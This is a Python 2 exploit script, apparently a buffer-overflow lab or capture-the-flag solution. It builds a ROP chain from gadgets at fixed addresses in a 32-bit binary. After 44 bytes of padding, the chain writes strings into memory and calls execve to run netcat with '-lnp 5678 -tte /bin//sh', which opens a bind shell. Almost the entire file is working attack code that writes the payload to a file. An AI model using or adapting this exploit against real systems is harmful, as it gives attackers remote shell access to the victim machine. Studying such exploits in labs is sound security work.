"""
We want to execute "/tmp/nc -lnp 5678 -tte /bin/sh" via execve syscall.

----------------------------------------
execve calling convention:

1. EAX = 11
2. EBX = "/tmp//nc" (char *)
3. ECX = arguments (char **) -> char *arguments[7]= { "/tmp//nc", "-lnp", "5678", "-tte", "/bin//sh", NULL}
4. EDX = env (char **) -> NULL
-----------------------------------------

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x8056d05 mov dword ptr [edx], eax ; ret
	[+] Gadget found: 0x806ee8b pop edx ; ret
	[+] Gadget found: 0x80a8bf6 pop eax ; ret
	[+] Gadget found: 0x80562c0 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x80562c0 xor eax, eax ; ret
	[+] Gadget found: 0x807c32a inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x80481c9 pop ebx ; ret
	[+] Gadget found: 0x806eeb2 pop ecx ; pop ebx ; ret
	[+] Gadget found: 0x806ee8b pop edx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x8049603 int 0x80

- Step 5 -- Build the ROP chain
"""
#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack
import os

######################################

command = "/tmp//nc -lnp 5678 -tte /bin//sh"
POPEDX    = pack('<I', 0x0806ee8b)
STACK     = pack('<I', 0x080da060)
POPEAX    = pack('<I', 0x080a8bf6)
MOVISTACK = pack('<I', 0x08056d05)
XOREAX    = pack('<I', 0x080562c0)
INCEAX    = pack('<I', 0x0807c32a)
INT80     = pack('<I', 0x08049603)
POPEBX    = pack('<I', 0x080481c9)
POPECXEBX = pack('<I', 0x0806eeb2)
X = 0x080da060 + len(command) + 1

fileName=raw_input("Enter the file name: ")
outfile=open(fileName, "wb")

# Padding goes here
p = '\x41'* 44

p += POPEDX # pop edx ; ret
p += STACK # @ .data

p += POPEAX # pop eax ; ret
p += '/tmp'
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4

p += POPEAX # pop eax ; ret
p += '//nc'
p += MOVISTACK # mov dword ptr [edx], eax ; ret

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8

p += XOREAX # xor eax, eax ; ret
p += MOVISTACK # mov dword ptr [edx], eax ; ret

# Add '-lnp' to the stack

p += POPEDX
p += pack('<I', 0x080da060 + 9)

p += POPEAX
p += '-lnp'
p += MOVISTACK

p += POPEDX
p += pack('<I', 0x080da060 + 13)
p += XOREAX
p += MOVISTACK

# Add '5678' to the stack

p += POPEDX
p += pack('<I', 0x080da060 + 14)

p += POPEAX
p += '5678'
p += MOVISTACK

p += POPEDX
p += pack('<I', 0x080da060 + 18)
p += XOREAX
p += MOVISTACK

# Add '-tte' to the stack

p += POPEDX
p += pack('<I', 0x080da060 + 19)

p += POPEAX
p += '-tte'
p += MOVISTACK

p += POPEDX
p += pack('<I', 0x080da060 + 23)
p += XOREAX
p += MOVISTACK

# Add '/bin//sh' to the stack

p += POPEDX
p += pack('<I', 0x080da060 + 24)

p += POPEAX
p += '/bin'
p += MOVISTACK

p += POPEDX
p += pack('<I', 0x080da060 + 28)

p += POPEAX
p += '//sh'
p += MOVISTACK

p += POPEDX
p += pack('<I', 0x080da060 + 32)
p += XOREAX
p += MOVISTACK

# Set ebx to point at '/tmp//nc' (base stack address)

p += POPEBX # pop ebx ; ret
p += STACK # @ .data

# Create shadow stack at base address + 60

# Add '/tmp//nc' to the argument list
p += POPEDX
p += pack('<I', 0x080da060 + 60)

p += POPEAX
p += pack('<I', 0x080da060)
p += MOVISTACK

# Add '-lnp' to the argument list
p += POPEDX
p += pack('<I', 0x080da060 + 64)

p += POPEAX
p += pack('<I', 0x080da060 + 9)
p += MOVISTACK

# Add '5678' to the argument list
p += POPEDX
p += pack('<I', 0x080da060 + 68)

p += POPEAX
p += pack('<I', 0x080da060 + 14)
p += MOVISTACK

# Add '-tte' to the argument list
p += POPEDX
p += pack('<I', 0x080da060 + 72)

p += POPEAX
p += pack('<I', 0x080da060 + 19)
p += MOVISTACK

# Add '/bin//sh' to the argument list
p += POPEDX
p += pack('<I', 0x080da060 + 76)

p += POPEAX
p += pack('<I', 0x080da060 + 24)
p += MOVISTACK

p += POPECXEBX # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da060 + 60) # @ .data + 60
p += pack('<I', 0x080da060) # padding without overwrite ebx

p += POPEDX # pop edx ; ret
p += pack('<I', 0x080da060 + 48) # @ .data + 48

p += XOREAX # xor eax, eax ; ret
p += INCEAX * 11 # inc eax ; ret 11 times
p += INT80 # int 0x80

outfile.write(p)
outfile.close()
